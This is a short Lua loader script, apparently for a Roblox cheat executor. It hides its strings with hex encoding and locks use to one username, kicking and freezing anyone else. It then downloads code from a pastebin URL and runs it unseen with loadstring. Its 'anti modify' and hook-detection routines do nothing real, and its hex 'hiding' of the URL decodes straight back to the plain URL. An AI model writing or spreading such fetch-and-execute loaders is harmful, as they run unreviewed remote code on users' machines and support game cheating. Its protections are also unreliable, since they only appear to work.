local _x=function(a) return (string.gsub(a,".",function(b) 
    return string.format("%02x",string.byte(b)) end)) end
local _d=function(a) 
    local s=""
    for i=1,#a,2 do s=s..string.char(tonumber(a:sub(i,i+1),16)) end
    return s
end

-- Username Lock
local function _ul()
    local plr=game:GetService(_d("506c6179657273"))["LocalPlayer"]
    if tostring(plr.Name)~=_d("6d61636d6163696e526f626c6f78") then
        game:GetService(_d("52656e64")):SetCore(_d("53656e644572726f72"),{_d("554e415554484f52495a4544205748494c45204c4f4144494e47203a28")})
        task.wait(1)
        plr:Kick(_d("4163636573732044656e696564"))
        while true do end
    end
end

-- Anti Modify
local function _am()
    local src = getfenv(1)
    if not src or not getfenv then return end
    if not pcall(function() return src end) then
        while true do end
    end
end

-- Anti Cheat Engine / Hook Detection
local function _ac()
    if hookfunction or hookmetamethod or newcclosure then
        -- basic tamper flag check
        for i=1,20 do end
    end
end

-- Loader Start
task.spawn(_ul)
task.spawn(_am)
task.spawn(_ac)

-- Load Main Script (hidden URL)
local main = _d(_x("https://pastebin.com/raw/ppgDv958"))
local data = game:HttpGet(main)

-- Anti Empty / Fake load
if not data or #data < 5 then
    while true do end
end

-- Protected execution
local ok,err = pcall(function()
    loadstring(data)()
end)

if not ok then
    error("Loader Integrity Failure.")
end
